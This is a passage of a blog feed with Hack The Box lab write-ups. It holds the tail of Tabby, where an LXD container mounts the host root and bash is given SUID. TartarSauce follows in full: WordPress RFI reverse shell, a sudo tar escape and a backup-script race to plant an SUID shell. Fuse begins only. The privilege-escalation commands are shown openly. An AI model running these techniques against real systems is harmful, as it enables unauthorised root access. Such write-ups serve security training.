<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
lxc image import alpine-small-image.tar.gz <span class="nt">--alias</span> myimage
lxc image list
lxc init myimage mycontainer <span class="nt">-c</span> security.privileged<span class="o">=</span><span class="nb">true
</span>lxc config device add mycontainer mydevice disk <span class="nb">source</span><span class="o">=</span>/ <span class="nv">path</span><span class="o">=</span>/mnt/root <span class="nv">recursive</span><span class="o">=</span><span class="nb">true
</span>lxc start mycontainer
lxc <span class="nb">exec </span>mycontainer /bin/sh
</code></pre></div></div>

<p><em>after getting the container root shell,</em> we add an <strong>SUID bit</strong> to the host’s <strong>bash shell</strong> so we can run it as <code class="language-plaintext highlighter-rouge">root</code></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">chmod</span> +s /mnt/root/bin/bash
</code></pre></div></div>

<p><img src="/assets/Tabby/lxc-root-bash-script.jpg" alt="" /></p>

<h2 id="cleaning-up">Cleaning Up</h2>

<p><em>To clear away remnants,</em> we have to <strong>stop the container</strong> and <strong>delete it</strong> along with <strong>the image we imported.</strong></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>lxc stop mycontainer
lxc delete mycontainer
lxc image delete myimage
</code></pre></div></div>

<p><img src="/assets/Tabby/lxc-cleanup.jpg" alt="" /></p>]]></content><author><name></name></author><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HTB Writeup [Linux - Medium] - TartarSauce</title><link href="http://localhost:4000/2022/08/21/TartarSauce.html" rel="alternate" type="text/html" title="HTB Writeup [Linux - Medium] - TartarSauce" /><published>2022-08-21T00:00:00+02:00</published><updated>2022-08-21T00:00:00+02:00</updated><id>http://localhost:4000/2022/08/21/TartarSauce</id><content type="html" xml:base="http://localhost:4000/2022/08/21/TartarSauce.html"><![CDATA[<p><img src="/assets/TartarSauce/TartarSauce.png" alt="" /></p>

<h2 id="summary">Summary</h2>
<ul>
  <li><strong>TartarSauce</strong> is a <strong>Linux</strong> machine where <em>only port 80 was open.</em></li>
  <li><em>On the webroot</em>, the <code class="language-plaintext highlighter-rouge">robots.txt</code> file had entries for a <strong>CMS</strong> called <strong>“Monstra”</strong> where we could log on using <strong>weak credentials.</strong></li>
  <li><em>Even though the</em> <strong><em>CMS had plenty of exploitable functionalities</em></strong>, we <strong>couldn’t exploit</strong> any <strong>due to the restrictions in place</strong>. so we looked elsewhere.</li>
  <li><em>After we do some</em> <strong><em>web directory brute forcing</em></strong>, we discover a <strong>WordPress instance</strong> that had a <strong>plugin vulnerable to RFI</strong>.</li>
  <li>We <strong>successfully exploit the vulnerability</strong> and get <strong>Remote Code Execution</strong> as <code class="language-plaintext highlighter-rouge">www-data</code>.</li>
  <li>We find that we have a <code class="language-plaintext highlighter-rouge">sudo</code> <strong>privilege</strong> to <strong>run</strong> the <code class="language-plaintext highlighter-rouge">tar</code> command as the <code class="language-plaintext highlighter-rouge">onuma</code> user. We <strong>exploit that</strong> and get a shell.</li>
  <li>Running <code class="language-plaintext highlighter-rouge">linpeas.sh</code> for <strong>privilege escalation</strong> shows us a <strong>system timer</strong> that <strong>runs a script</strong> (<code class="language-plaintext highlighter-rouge">backuperer</code>) every 5 minutes.</li>
  <li><em>Since that script ran as</em> <code class="language-plaintext highlighter-rouge">root</code>, we analyzed it to find that it <strong>extracts an archive that we can control</strong> <em>during execution.</em></li>
  <li><em>By inserting an</em> <strong>SUID shell</strong> <em>into a</em> <strong>tar archive</strong> <em>of our own</em>, and then <strong><em>replacing the initial archive with it</em></strong>. We take advantage of the script <strong>extracting our SUID shell</strong> and <strong><em>becoming its owner in the process</em></strong>. Thus <strong>giving us a root shell ;]</strong></li>
</ul>

<p><strong><em>That last part unclear? don’t worry. it gets its fair share of breakdown <a href="#detecting-system-operations">below</a> :)</em></strong></p>

<hr />

<h2 id="nmap">NMAP</h2>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 5 disallowed entries 
| /webservices/tar/tar/source/ 
| /webservices/monstra-3.0.4/ /webservices/easy-file-uploader/ 
|_/webservices/developmental/ /webservices/phpmyadmin/
|_http-title: Landing Page
|_http-server-header: Apache/2.4.18 (Ubuntu)
</code></pre></div></div>

<p><em>Starting with</em> <strong>nmap</strong>, it gave it to us straight… only <strong>port 80</strong> here :D</p>

<p>The home page shows <em>nothing special</em>. Just a <strong>Text Art</strong> bottle of <strong>Tartar Sauce.</strong></p>

<p><img src="/assets/TartarSauce/home-page-tartar-sauce.jpg" alt="" /></p>

<p><code class="language-plaintext highlighter-rouge">robots.txt</code> shows us <strong>a few urls to try</strong>. So we create a small list and feed it to <code class="language-plaintext highlighter-rouge">gobuster</code>.</p>

<p><img src="/assets/TartarSauce/curling-robots-txt.jpg" alt="" /></p>

<p>Only <code class="language-plaintext highlighter-rouge">http://tartarsauce/webservices/monstra-3.0.4/</code> was valid. So we check it out.</p>

<h2 id="the-monstra-cms">The Monstra CMS</h2>

<p>Here’s what the home page looked like:</p>

<p><img src="/assets/TartarSauce/monstra-homepage.jpg" alt="" /></p>

<p>most links on it led to a <code class="language-plaintext highlighter-rouge">404 - Not Found</code> <em>except for the</em> <strong>login form</strong>:</p>

<p><img src="/assets/TartarSauce/monstra-login-page.jpg" alt="" /></p>

<p>we could log in with <code class="language-plaintext highlighter-rouge">admin:admin</code></p>

<p><img src="/assets/TartarSauce/monstra-logged-in.jpg" alt="" /></p>

<p><em>however,</em> we <strong>couldn’t abuse any functionalities</strong> to get <strong>RCE</strong>.</p>

<p><strong>Check #1:</strong> <strong>Uploading a reverse shell</strong> failed.</p>

<p><img src="/assets/TartarSauce/monstra-file-upload-fail.jpg" alt="" /></p>

<p><strong>Check #2:</strong> <strong>Installing a malicious plugin..</strong> the same.</p>

<p><img src="/assets/TartarSauce/monstra-install-plugin-fail.jpg" alt="" /></p>

<p><strong>Check #3:</strong> <strong>Editing themes to insert PHP…</strong> no dice :/</p>

<p><img src="/assets/TartarSauce/monstra-editing-themese.jpg" alt="" /></p>

<p><img src="/assets/TartarSauce/monstra-editing-themes-2.jpg" alt="" /></p>

<p><em>After</em> <strong><em>all the exploits on ExploitDB failed,</em></strong> we decided <strong>Monstra was relatively secure</strong> and it was <strong><em>time to look elsewhere :D</em></strong></p>

<p><img src="/assets/TartarSauce/monstra-exploit-db-fail.jpg" alt="" /></p>

<h2 id="finding-a-wordpress-instance">Finding a Wordpress Instance</h2>

<p><em>After running another quick</em> <code class="language-plaintext highlighter-rouge">gobuster</code>, we found <strong><em>another web directory:</em></strong> <code class="language-plaintext highlighter-rouge">wp</code></p>

<p><img src="/assets/TartarSauce/finding-wordpress.jpg" alt="" /></p>

<p>it contained a <strong>Wordpress</strong> blog</p>

<p><img src="/assets/TartarSauce/wordpress-homepage.jpg" alt="" /></p>

<p><em>Naturally,</em> we run <code class="language-plaintext highlighter-rouge">wpscan</code> to enumerate <code class="language-plaintext highlighter-rouge">-e</code>:</p>
<ul>
  <li>All <strong>plugins</strong> <code class="language-plaintext highlighter-rouge">ap</code></li>
  <li>All <strong>themes</strong> <code class="language-plaintext highlighter-rouge">at</code></li>
  <li><strong>Timthumbs</strong> <code class="language-plaintext highlighter-rouge">tt</code></li>
  <li><strong>Config backups</strong> <code class="language-plaintext highlighter-rouge">cb</code></li>
  <li><strong>Database exports</strong> <code class="language-plaintext highlighter-rouge">dbe</code></li>
  <li>And <strong>Users</strong> <code class="language-plaintext highlighter-rouge">u</code></li>
</ul>

<p><strong>Important to note:</strong> adding the <code class="language-plaintext highlighter-rouge">--plugins-detection</code> flag with the <code class="language-plaintext highlighter-rouge">aggressive</code> mode is <strong>key</strong> in this step.</p>

<p>That’s because the recent versions of <code class="language-plaintext highlighter-rouge">wpscan</code> -<em>by default</em>- use the -<em>too polite and gentle</em>- <code class="language-plaintext highlighter-rouge">passive</code> mode which <strong>won’t detect any plugins</strong> and thus <strong>block the main exploitation path</strong>.</p>

<p>That part took me a while to figure out *<strong><em>smiles in pain</em></strong>*.</p>

<p>Here’s the command:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wpscan <span class="nt">--url</span> http://tartarsauce/webservices/wp/ <span class="nt">-e</span> ap,at,tt,cb,dbe,u <span class="nt">--plugins-detection</span> aggressive <span class="nt">-t</span> 50
</code></pre></div></div>

<p>The output showed <strong>a total of 3 plugins:</strong></p>

<p><img src="/assets/TartarSauce/wordpress-plugins.jpg" alt="" /></p>

<p><em>After searching,</em> the <code class="language-plaintext highlighter-rouge">Gwolle Guestbook</code> plugin turned out to have <strong>a Remote File Inclusion vulnerability</strong> on the URL highlighted below:</p>

<p><img src="/assets/TartarSauce/wordpress-vuln-plugin.jpg" alt="" /></p>

<p><em>Following the exploit steps,</em> we:</p>
<ol>
  <li><strong>Copy our favourite PHP reverse shell</strong> <code class="language-plaintext highlighter-rouge">/usr/share/webshells/php/php-reverse-shell.php</code> to <code class="language-plaintext highlighter-rouge">rev.txt</code></li>
  <li><strong>Modify</strong> the <code class="language-plaintext highlighter-rouge">ip</code> and <code class="language-plaintext highlighter-rouge">port</code> variables</li>
  <li><strong>Serve it</strong> on a <code class="language-plaintext highlighter-rouge">python</code> webserver</li>
  <li>Start a <code class="language-plaintext highlighter-rouge">netcat</code> listener to <strong>catch the connect back</strong></li>
  <li><code class="language-plaintext highlighter-rouge">curl</code> the <strong>vulnerable endpoint</strong> while placing a question mark <code class="language-plaintext highlighter-rouge">?</code> at the end. (This is because the plugin appends <code class="language-plaintext highlighter-rouge">wp-load.php</code> to the request. So we use the <code class="language-plaintext highlighter-rouge">?</code> to break off the url at that point)</li>
</ol>

<p><img src="/assets/TartarSauce/RFI-2-shell.jpg" alt="" /></p>

<p>Sweet :D</p>

<h2 id="pivoting-to-onuma">Pivoting to Onuma</h2>
<p><em>After</em> <strong><em>optimizing our shell,</em></strong> we get to work.</p>

<p><img src="/assets/TartarSauce/shell-pimping.jpg" alt="" /></p>

<p><em>when we type</em> <code class="language-plaintext highlighter-rouge">sudo -l</code> <em>to check our</em> <strong>sudo privileges</strong>, we find that we can run the <code class="language-plaintext highlighter-rouge">tar</code> command as the <code class="language-plaintext highlighter-rouge">onuma</code> user.</p>

<p><img src="/assets/TartarSauce/sudo-tar.jpg" alt="" /></p>

<p>A quick look on <a href="https://gtfobins.github.io/gtfobins/tar/">GTFOBins</a> tells us that <strong>we can get a shell</strong> with that:</p>

<p><img src="/assets/TartarSauce/gtfobins-tar.jpg" alt="" /></p>

<p>It was legit. we’re now interacting as <code class="language-plaintext highlighter-rouge">onuma</code></p>

<p><img src="/assets/TartarSauce/shell-as-onuma.jpg" alt="" /></p>

<h2 id="detecting-system-operations">Detecting system operations</h2>
<p><em>When running a quick</em> <a href="https://github.com/carlospolop/PEASS-ng">linpeas.sh</a>, we spot a <strong>unique system timer:</strong></p>

<p><img src="/assets/TartarSauce/system-timers.jpg" alt="" /></p>

<p>and <strong>other files</strong> that stick out</p>

<p><img src="/assets/TartarSauce/backup-files-modified.jpg" alt="" /></p>

<p>We do a quick <em>case-insensitive</em> <code class="language-plaintext highlighter-rouge">find</code> to search for <strong>everything that has the word “backup” in it.</strong></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find / <span class="nt">-type</span> f <span class="nt">-iname</span> <span class="s1">'*backup*'</span> 2&gt;/dev/null
</code></pre></div></div>

<p>there was a <code class="language-plaintext highlighter-rouge">bash</code> script called <code class="language-plaintext highlighter-rouge">backuperer</code> in <code class="language-plaintext highlighter-rouge">/usr/bin</code></p>

<p><img src="/assets/TartarSauce/finding-backuperer-script.jpg" alt="" /></p>

<p>the contents:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>

<span class="c">#-------------------------------------------------------------------------------------</span>
<span class="c"># backuperer ver 1.0.2 - by ȜӎŗgͷͼȜ</span>
<span class="c"># ONUMA Dev auto backup program</span>
<span class="c"># This tool will keep our webapp backed up incase another skiddie defaces us again.</span>
<span class="c"># We will be able to quickly restore from a backup in seconds ;P</span>
<span class="c">#-------------------------------------------------------------------------------------</span>

<span class="c"># Set Vars Here</span>
<span class="nv">basedir</span><span class="o">=</span>/var/www/html
<span class="nv">bkpdir</span><span class="o">=</span>/var/backups
<span class="nv">tmpdir</span><span class="o">=</span>/var/tmp
<span class="nv">testmsg</span><span class="o">=</span><span class="nv">$bkpdir</span>/onuma_backup_test.txt
<span class="nv">errormsg</span><span class="o">=</span><span class="nv">$bkpdir</span>/onuma_backup_error.txt
<span class="nv">tmpfile</span><span class="o">=</span><span class="nv">$tmpdir</span>/.<span class="si">$(</span>/usr/bin/head <span class="nt">-c100</span> /dev/urandom |sha1sum|cut <span class="nt">-d</span><span class="s1">' '</span> <span class="nt">-f1</span><span class="si">)</span>
<span class="nv">check</span><span class="o">=</span><span class="nv">$tmpdir</span>/check

<span class="c"># formatting</span>
printbdr<span class="o">()</span>
<span class="o">{</span>
    <span class="k">for </span>n <span class="k">in</span> <span class="si">$(</span><span class="nb">seq </span>72<span class="si">)</span><span class="p">;</span>
    <span class="k">do</span> /usr/bin/printf <span class="s2">$"-"</span><span class="p">;</span>
    <span class="k">done</span>
<span class="o">}</span>
<span class="nv">bdr</span><span class="o">=</span><span class="si">$(</span>printbdr<span class="si">)</span>

<span class="c"># Added a test file to let us see when the last backup was run</span>
/usr/bin/printf <span class="s2">$"</span><span class="nv">$bdr</span><span class="se">\n</span><span class="s2">Auto backup backuperer backup last ran at : </span><span class="si">$(</span>/bin/date<span class="si">)</span><span class="se">\n</span><span class="nv">$bdr</span><span class="se">\n</span><span class="s2">"</span> <span class="o">&gt;</span> <span class="nv">$testmsg</span>

<span class="c"># Cleanup from last time.</span>
/bin/rm <span class="nt">-rf</span> <span class="nv">$tmpdir</span>/.<span class="k">*</span> <span class="nv">$check</span>

<span class="c"># Backup onuma website dev files.</span>
/usr/bin/sudo <span class="nt">-u</span> onuma /bin/tar <span class="nt">-zcvf</span> <span class="nv">$tmpfile</span> <span class="nv">$basedir</span> &amp;

<span class="c"># Added delay to wait for backup to complete if large files get added.</span>
/bin/sleep 30

<span class="c"># Test the backup integrity</span>
integrity_chk<span class="o">()</span>
<span class="o">{</span>
    /usr/bin/diff <span class="nt">-r</span> <span class="nv">$basedir</span> <span class="nv">$check$basedir</span>
<span class="o">}</span>

/bin/mkdir <span class="nv">$check</span>
/bin/tar <span class="nt">-zxvf</span> <span class="nv">$tmpfile</span> <span class="nt">-C</span> <span class="nv">$check</span>
<span class="k">if</span> <span class="o">[[</span> <span class="si">$(</span>integrity_chk<span class="si">)</span> <span class="o">]]</span>
<span class="k">then</span>
    <span class="c"># Report errors so the dev can investigate the issue.</span>
    /usr/bin/printf <span class="s2">$"</span><span class="nv">$bdr</span><span class="se">\n</span><span class="s2">Integrity Check Error in backup last ran :  </span><span class="si">$(</span>/bin/date<span class="si">)</span><span class="se">\n</span><span class="nv">$bdr</span><span class="se">\n</span><span class="nv">$tmpfile</span><span class="se">\n</span><span class="s2">"</span> <span class="o">&gt;&gt;</span> <span class="nv">$errormsg</span>
    integrity_chk <span class="o">&gt;&gt;</span> <span class="nv">$errormsg</span>
    <span class="nb">exit </span>2
<span class="k">else</span>
    <span class="c"># Clean up and save archive to the bkpdir.</span>
    /bin/mv <span class="nv">$tmpfile</span> <span class="nv">$bkpdir</span>/onuma-www-dev.bak
    /bin/rm <span class="nt">-rf</span> <span class="nv">$check</span> .<span class="k">*</span>
    <span class="nb">exit </span>0
<span class="k">fi</span>
</code></pre></div></div>
<p><em>removing the excess lines and comments,</em> it’s around <strong>30 lines of code</strong>. not too bad I guess :)</p>

<h2 id="breaking-down-backuperer">Breaking down “Backuperer”</h2>
<p>Let’s first <strong>break down all the variables</strong> for <strong>absolute paths</strong></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Set Vars Here</span>
<span class="nv">basedir</span><span class="o">=</span>/var/www/html
<span class="nv">bkpdir</span><span class="o">=</span>/var/backups
<span class="nv">tmpdir</span><span class="o">=</span>/var/tmp

<span class="nv">testmsg</span><span class="o">=</span>/var/backups/onuma_backup_test.txt
<span class="nv">errormsg</span><span class="o">=</span>/var/backups/onuma_backup_error.txt

<span class="nv">tmpfile</span><span class="o">=</span>/var/tmp/.<span class="si">$(</span>/usr/bin/head <span class="nt">-c100</span> /dev/urandom |sha1sum|cut <span class="nt">-d</span><span class="s1">' '</span> <span class="nt">-f1</span><span class="si">)</span>
<span class="nv">check</span><span class="o">=</span>/var/tmp/check
</code></pre></div></div>

<p>all self-explanatory except for the <code class="language-plaintext highlighter-rouge">tmpfile</code> variable, which is just a <code class="language-plaintext highlighter-rouge">SHA1</code> value</p>

<p>Here’s what we get when run that line on its own:</p>

<p><img src="/assets/TartarSauce/sha1sum.jpg" alt="" /></p>

<p>next, the <code class="language-plaintext highlighter-rouge">printbdr</code> function</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># formatting</span>
printbdr<span class="o">()</span>
<span class="o">{</span>
    <span class="k">for </span>n <span class="k">in</span> <span class="si">$(</span><span class="nb">seq </span>72<span class="si">)</span><span class="p">;</span>
    <span class="k">do</span> /usr/bin/printf <span class="s2">$"-"</span><span class="p">;</span>
    <span class="k">done</span>
<span class="o">}</span>
<span class="nv">bdr</span><span class="o">=</span><span class="si">$(</span>printbdr<span class="si">)</span>
</code></pre></div></div>

<p>it just <strong>creates a border</strong> for <strong>nice formatting</strong></p>

<p><img src="/assets/TartarSauce/bdr-function.jpg" alt="" /></p>

<p>then, the script:</p>
<ul>
  <li><strong>does some cleanup from older runs</strong></li>
  <li><strong>tars up</strong> the <code class="language-plaintext highlighter-rouge">basedir</code> (<code class="language-plaintext highlighter-rouge">/var/www/html</code>) into <code class="language-plaintext highlighter-rouge">tmpfile</code> (<code class="language-plaintext highlighter-rouge">/var/tmp/.&lt;SHA1SUM&gt;</code>)</li>
  <li>then <strong>sleeps for 30 seconds.</strong> <em>(This is in case the backup process takes longer than expected.)</em></li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Cleanup from last time.</span>
/bin/rm <span class="nt">-rf</span> <span class="nv">$tmpdir</span>/.<span class="k">*</span> <span class="nv">$check</span>

<span class="c"># Backup onuma website dev files.</span>
/usr/bin/sudo <span class="nt">-u</span> onuma /bin/tar <span class="nt">-zcvf</span> <span class="nv">$tmpfile</span> <span class="nv">$basedir</span> &amp;

<span class="c"># Added delay to wait for backup to complete if large files get added.</span>
/bin/sleep 30
</code></pre></div></div>

<p>The following is a <strong>function</strong> that does a <strong><em>recursive</em></strong> <code class="language-plaintext highlighter-rouge">diff</code> between <code class="language-plaintext highlighter-rouge">basedir</code> (<code class="language-plaintext highlighter-rouge">var/www/html</code>) and <code class="language-plaintext highlighter-rouge">check+basedir</code> (<code class="language-plaintext highlighter-rouge">/var/tmp/check/var/www/html</code>)</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Test the backup integrity</span>
integrity_chk<span class="o">()</span>
<span class="o">{</span>
    /usr/bin/diff <span class="nt">-r</span> <span class="nv">$basedir</span> <span class="nv">$check$basedir</span>
<span class="o">}</span>
</code></pre></div></div>

<p>here’s a quick <strong>example</strong> of how a recursive diff works:</p>

<p><img src="/assets/TartarSauce/recursive-diff-example.jpg" alt="" /></p>

<p>This function would make much more sense with the lines that follow:</p>
<ul>
  <li>creating the <code class="language-plaintext highlighter-rouge">check</code> directory <code class="language-plaintext highlighter-rouge">/var/tmp/check</code>
    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/bin/mkdir <span class="nv">$check</span>
</code></pre></div>    </div>
  </li>
  <li>extracting the <code class="language-plaintext highlighter-rouge">tmpfile</code> (<code class="language-plaintext highlighter-rouge">/var/tmp/.&lt;SHA1SUM&gt;</code>) into it
    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/bin/tar <span class="nt">-zxvf</span> <span class="nv">$tmpfile</span> <span class="nt">-C</span> <span class="nv">$check</span>
</code></pre></div>    </div>
  </li>
</ul>

<p>The <strong>integrity check</strong> is <strong>validation</strong> that <strong>the backup</strong> <em>exactly matches</em> the <strong>backed up data</strong> and <strong>no corruption has occured.</strong></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="o">[[</span> <span class="si">$(</span>integrity_chk<span class="si">)</span> <span class="o">]]</span>
<span class="k">then</span>
    <span class="c"># Report errors so the dev can investigate the issue.</span>
    /usr/bin/printf <span class="s2">$"</span><span class="nv">$bdr</span><span class="se">\n</span><span class="s2">Integrity Check Error in backup last ran :  </span><span class="si">$(</span>/bin/date<span class="si">)</span><span class="se">\n</span><span class="nv">$bdr</span><span class="se">\n</span><span class="nv">$tmpfile</span><span class="se">\n</span><span class="s2">"</span> <span class="o">&gt;&gt;</span> <span class="nv">$errormsg</span>
    integrity_chk <span class="o">&gt;&gt;</span> <span class="nv">$errormsg</span>
    <span class="nb">exit </span>2
<span class="k">else</span>
    <span class="c"># Clean up and save archive to the bkpdir.</span>
    /bin/mv <span class="nv">$tmpfile</span> <span class="nv">$bkpdir</span>/onuma-www-dev.bak
    /bin/rm <span class="nt">-rf</span> <span class="nv">$check</span> .<span class="k">*</span>
    <span class="nb">exit </span>0
<span class="k">fi</span>
</code></pre></div></div>

<h2 id="exploiting-tar-to-root-the-box">Exploiting tar to root the box</h2>

<p>There’s <strong>a way to escalate our privileges</strong> to <code class="language-plaintext highlighter-rouge">root</code></p>

<p>Because:</p>
<ol>
  <li>The script <strong>backs up the website</strong> into <code class="language-plaintext highlighter-rouge">/var/tmp/.&lt;SHA1SUM&gt;</code> as <code class="language-plaintext highlighter-rouge">onuma</code> (<em>we own this user and this makes that archive writable</em>)</li>
  <li>It then <strong>sleeps for 30 seconds</strong>. which is <strong>enough time</strong> for us to <strong><em>swap the archive with a malicious one</em></strong></li>
  <li><strong>creates</strong> a <code class="language-plaintext highlighter-rouge">check</code> directory, <strong>extracting</strong> the contents of the -<strong><em>then manipulated</em></strong>- <code class="language-plaintext highlighter-rouge">/var/tmp/.&lt;SHA1SUM&gt;</code> into it before doing the integrity check</li>
</ol>

<p><strong>The key here</strong> is that: <strong>everything the script extracts would be owned by root!</strong></p>

<p>So we just need to:</p>
<ol>
  <li><strong>Create an SUID shell</strong> and <strong>embed it within a tar archive</strong></li>
  <li><strong>Wait for the first backup to complete</strong> (<code class="language-plaintext highlighter-rouge">/var/www/html</code> to <code class="language-plaintext highlighter-rouge">/var/tmp/.&lt;SHA1SUM&gt;</code>)</li>
  <li><strong>Replace</strong> the <code class="language-plaintext highlighter-rouge">/var/tmp/.&lt;SHA1SUM&gt;</code> with <strong>the one we created</strong></li>
  <li><strong>Wait for the extraction</strong> to be done by <code class="language-plaintext highlighter-rouge">root</code> into the <code class="language-plaintext highlighter-rouge">check</code> directory</li>
  <li><strong>Go within the extracted contents</strong> and <strong>run the root shell :)</strong></li>
</ol>

<p><em>But before executing this evil plan,</em> let’s first observe the script in action:</p>

<p>We’ll go to <code class="language-plaintext highlighter-rouge">/var/tmp</code> and do a <code class="language-plaintext highlighter-rouge">watch</code> command to <strong>keep an eye</strong> on <strong>the timer</strong> (<code class="language-plaintext highlighter-rouge">systemctl list-timers</code>) as well as <strong>the directory contents</strong> (<code class="language-plaintext highlighter-rouge">ls -la</code>)</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd</span> /var/tmp
watch <span class="nt">-n</span> 1 <span class="s1">'systemctl list-timers; ls -la'</span>
</code></pre></div></div>

<p>here, the <code class="language-plaintext highlighter-rouge">/var/tmp</code> directory is empty before any execution</p>

<p><img src="/assets/TartarSauce/watching-timers-and-contents.jpg" alt="" /></p>

<p><em>26 seconds after the code ran,</em> notice the <code class="language-plaintext highlighter-rouge">SHA1</code> (<code class="language-plaintext highlighter-rouge">$tmpfile</code>) got created.</p>

<p>it’s owned by <code class="language-plaintext highlighter-rouge">onuma</code> (<em>since it’s the output of</em> <strong>line 35</strong>)</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/usr/bin/sudo <span class="nt">-u</span> onuma /bin/tar <span class="nt">-zcvf</span> <span class="nv">$tmpfile</span> <span class="nv">$basedir</span> &amp;
</code></pre></div></div>

<p><img src="/assets/TartarSauce/tmp-file-creation.jpg" alt="" /></p>

<p><em>After the 30-second sleep interval has passed,</em> the <code class="language-plaintext highlighter-rouge">check</code> directory (<code class="language-plaintext highlighter-rouge">$check</code>) is now there with the contents of the <code class="language-plaintext highlighter-rouge">$tmpfile</code> inside.</p>

<p>it’s owned by <code class="language-plaintext highlighter-rouge">root</code> (<em>as it’s the output of</em> <strong>line 47</strong>)</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/bin/tar <span class="nt">-zxvf</span> <span class="nv">$tmpfile</span> <span class="nt">-C</span> <span class="nv">$check</span>
</code></pre></div></div>

<p><img src="/assets/TartarSauce/check-directory-created.jpg" alt="" /></p>

<p><em>Having seen everything up close,</em> let’s prepare the <strong>SUID shell</strong></p>

<p><img src="/assets/TartarSauce/killershell-c.jpg" alt="" /></p>

<p>We compile it using <code class="language-plaintext highlighter-rouge">gcc</code> with the <code class="language-plaintext highlighter-rouge">-m32</code> flag to <strong>match the victim’s architecture</strong></p>

<p><img src="/assets/TartarSauce/victim-arch.jpg" alt="" /></p>

<p><em>Even though we got a warning,</em> it’s been successfully compiled</p>

<p><img src="/assets/TartarSauce/compiling-killer-shell.jpg" alt="" /></p>

<p>We make sure to <strong>add the SUID bit</strong> and <strong>create the same directory structure</strong> (<code class="language-plaintext highlighter-rouge">/var/www/html</code>) within the archive.</p>

<p><img src="/assets/TartarSauce/crafting-killer-tar.jpg" alt="" /></p>

<p>we then <strong>transfer it over</strong> and <strong>overwrite</strong> the <code class="language-plaintext highlighter-rouge">SHA1</code> file <strong><em>as soon as the file length stabilizes.</em></strong> (<em>to avoid interrupting the first backup</em>)</p>

<p>we <strong>wait 30 seconds for the extraction</strong> to be done in the <code class="language-plaintext highlighter-rouge">check</code> directory.</p>

<p><em>going into the extract,</em> a sweet <strong>SUID shell</strong> is there waiting for us :D</p>

<p>it’s all in the image below:</p>

<p><img src="/assets/TartarSauce/tar-ownage-for-root.jpg" alt="" /></p>

<p><strong>Wicked!</strong></p>]]></content><author><name></name></author><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HTB Writeup [Windows - Medium] - Fuse</title><link href="http://localhost:4000/2022/08/19/Fuse.html" rel="alternate" type="text/html" title="HTB Writeup [Windows - Medium] - Fuse" /><published>2022-08-19T00:00:00+02:00</published><updated>2022-08-19T00:00:00+02:00</updated><id>http://localhost:4000/2022/08/19/Fuse</id><content type="html" xml:base="http://localhost:4000/2022/08/19/Fuse.html"><![CDATA[<p><img src="/assets/Fuse/Fuse.png" alt="" /></p>

<h2 id="summary">Summary</h2>
<ul>
  <li>Fuse is a <strong>Windows Domain Controller</strong> machine with <strong>IIS</strong> listening on port 80.</li>
  <li><em>When checking the website,</em> we get <strong>redirected</strong> to a certain <strong>web page titled “PaperCut Print Logger”.</strong></li>
  <li><em>On that page,</em> we find the <strong>printing activity of some domain users</strong>. That gets us an initial <strong>list of usernames, workstations and document names.</strong></li>
  <li><strong>One of the documents’ name stuck out:</strong> <code class="language-plaintext highlighter-rouge">"Fabricorp01.docx"</code> which <strong><em>looked like a possible password/password scheme to try.</em></strong></li>
  <li><em>After spraying that password and others with the same pattern,</em> We find that <strong>it was indeed used by 3 of the users</strong>. But was <strong>expired and had to be changed.</strong></li>
  <li><em>Using the linux</em> <code class="language-plaintext highlighter-rouge">smbpassswd</code> <em>utility</em>, we were able to <strong>change passwords and gain access</strong>. But <strong>neither of the users had WinRM capability or valuable findings in their SMB shares</strong>.</li>
  <li><em>However, after doing a</em> <code class="language-plaintext highlighter-rouge">Bloodhound</code> <em>collection and inspecting the output</em>, we notice that <strong>there’s a potential path to Domain Administrator if we compromise the</strong> <code class="language-plaintext highlighter-rouge">svc-print</code> <strong>account</strong>. That’s because <strong>it has PowerShell Remoting access and is a member of the Print Operators AD group</strong> which <strong>hold the dangerous</strong> <code class="language-plaintext highlighter-rouge">SeLoadDriver</code> <strong>privilege.</strong></li>
  <li><em>Following the findings from</em> <code class="language-plaintext highlighter-rouge">Bloodhound</code> <em>and the</em> <strong><em>theme of printing</em></strong> <em>which was recurring throughout the machine</em>, we <strong>enumerate the printers of the domain</strong> to <strong>find a password in a printers’ description field</strong>.</li>
  <li>We <strong>run another password spray</strong> over all domain users with that password and <strong>get access to the</strong> <code class="language-plaintext highlighter-rouge">svc-print</code> <strong>account</strong>. We use it to <strong>gain a remote PowerShell session on the box.</strong></li>
  <li>We  then <strong>abuse its</strong> <code class="language-plaintext highlighter-rouge">SeLoadDriverPrivilege</code> to <strong>load a vulnerable driver into the kernel</strong> and <strong>exploit that to get code execution as</strong> <code class="language-plaintext highlighter-rouge">NT Authority\System</code>.</li>
</ul>

<hr />

<h2 id="nmap">NMAP</h2>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Simple DNS Plus
80/tcp    open  http         Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Microsoft-IIS/10.0
